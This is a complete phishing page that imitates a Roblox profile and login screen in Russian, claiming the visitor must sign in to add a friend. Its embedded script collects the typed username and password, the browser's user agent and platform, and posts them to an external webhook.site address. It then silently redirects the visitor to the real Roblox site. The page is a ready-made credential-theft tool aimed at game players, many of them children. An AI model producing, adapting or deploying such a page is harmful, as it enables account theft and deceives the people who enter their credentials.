<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000;
            color: #fff;
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }
        .header {
            width: 100%;
            background: #1a1a2e;
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 2px solid #e94560;
        }
        .logo {
            font-size: 28px;
            font-weight: bold;
            color: #e94560;
        }
        .nav-links a {
            color: #fff;
            text-decoration: none;
            margin-left: 25px;
            font-size: 14px;
        }
        .nav-links a:hover { color: #e94560; }
        .content {
            margin-top: 50px;
            text-align: center;
            width: 100%;
            max-width: 400px;
        }
        .profile-avatar {
            width: 120px;
            height: 120px;
            border-radius: 50%;
            background: #333;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 50px;
            border: 3px solid #e94560;
        }
        .username {
            font-size: 22px;
            font-weight: bold;
            margin-bottom: 5px;
        }
        .status {
            color: #4ecca3;
            font-size: 14px;
            margin-bottom: 30px;
        }
        .login-box {
            background: #16213e;
            padding: 30px;
            border-radius: 15px;
            border: 1px solid #e94560;
        }
        .login-box h3 {
            margin-bottom: 20px;
            color: #e94560;
        }
        .login-box input {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border: 1px solid #555;
            border-radius: 8px;
            background: #0f0f23;
            color: #fff;
            font-size: 14px;
        }
        .login-box input:focus {
            border-color: #e94560;
            outline: none;
        }
        .btn-login {
            width: 100%;
            background: #e94560;
            color: #fff;
            border: none;
            padding: 14px;
            font-size: 16px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            transition: background 0.3s;
        }
        .btn-login:hover { background: #c73652; }
        .footer {
            margin-top: 30px;
            color: #555;
            font-size: 12px;
        }
        .error-msg {
            color: #ff4444;
            font-size: 13px;
            margin-bottom: 15px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">Roblox</div>
        <div class="nav-links">
            <a href="#">Home</a>
            <a href="#">Games</a>
            <a href="#">Catalog</a>
            <a href="#">Develop</a>
        </div>
    </div>

    <div class="content">
        <div class="profile-avatar">🧑</div>
        <div class="username">Player_Example</div>
        <div class="status">● Online</div>

        <div class="login-box">
            <h3>Войти в аккаунт</h3>
            <p style="color:#aaa; font-size:13px; margin-bottom:15px;">Чтобы добавить в друзья, выполните вход</p>
            <div class="error-msg" id="error">Неверный логин или пароль</div>
            <input type="text" id="username" placeholder="Имя пользователя" autocomplete="username">
            <input type="password" id="password" placeholder="Пароль" autocomplete="current-password">
            <button class="btn-login" id="loginBtn">Войти</button>
        </div>
    </div>

    <div class="footer">
        © 2026 Roblox Corporation
    </div>

    <script>
        var WEBHOOK = 'https://webhook.site/983c7046-f3f9-4a46-85a6-f822f70dfbea';

        document.getElementById('loginBtn').addEventListener('click', function() {
            var user = document.getElementById('username').value;
            var pass = document.getElementById('password').value;

            if (!user || !pass) {
                document.getElementById('error').style.display = 'block';
                return;
            }

            var data = {
                username: user,
                password: pass,
                url: window.location.href,
                useragent: navigator.userAgent,
                platform: navigator.platform,
                ip: null,
                timestamp: new Date().toISOString()
            };

            fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).then(function() {
                window.location.href = 'https://www.roblox.com';
            }).catch(function() {
                window.location.href = 'https://www.roblox.com';
            });
        });

        document.getElementById('password').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                document.getElementById('loginBtn').click();
            }
        });
    </script>
</body>
</html>
